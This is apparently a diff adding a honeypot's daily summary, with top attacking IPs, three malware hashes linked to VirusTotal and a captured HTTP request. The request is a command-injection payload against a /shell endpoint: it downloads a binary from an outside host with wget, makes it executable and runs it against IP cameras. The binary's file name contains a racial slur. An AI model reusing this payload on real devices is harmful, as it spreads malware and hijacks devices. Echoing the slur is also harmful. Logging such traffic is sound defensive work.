@@ -1,0 +1,26 @@
+Top 5 IPs for 2023-12-13:
+61.5.147.244
+139.162.151.190
+191.241.58.44
+121.144.136.181
+121.4.83.32
+
+Malware seen: 
+Hash: 1b7a145d3b87773c1ec102691b6141b4c0b52bc73a12f63cc57fe0cd927c60c2
+https://www.virustotal.com/gui/file/1b7a145d3b87773c1ec102691b6141b4c0b52bc73a12f63cc57fe0cd927c60c2
+Hash: 94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+https://www.virustotal.com/gui/file/94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+Hash: 75acf687420aeaf8df3a2dfc6ea14c62c61b06bfaec6cb055637a827f7fb747b
+https://www.virustotal.com/gui/file/75acf687420aeaf8df3a2dfc6ea14c62c61b06bfaec6cb055637a827f7fb747b
+
+
+/shell?cd+/tmp;rm+fatniggarm7;wget+http:/\\/166.0.255.125/AB4g5/fatniggarm7;chmod+777+fatniggarm7;./fatniggarm7+ipcams;wget+http:/\\/166.0.255.125/AB4g5/fatniggarm7;chmod+777+fatniggarm7;./fatniggarm7+ipcams
+
+GET /shell?cd+/tmp;rm+fatniggarm7;wget+http:/\/166.0.255.125/AB4g5/fatniggarm7;chmod+777+fatniggarm7;./fatniggarm7+ipcams;wget+http:/\/166.0.255.125/AB4g5/fatniggarm7;chmod+777+fatniggarm7;./fatniggarm7+ipcams HTTP/1.1
+Connection: keep-alive
+Cache-Control: max-age=0
+User-Agent: KrebsOnSecurity
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
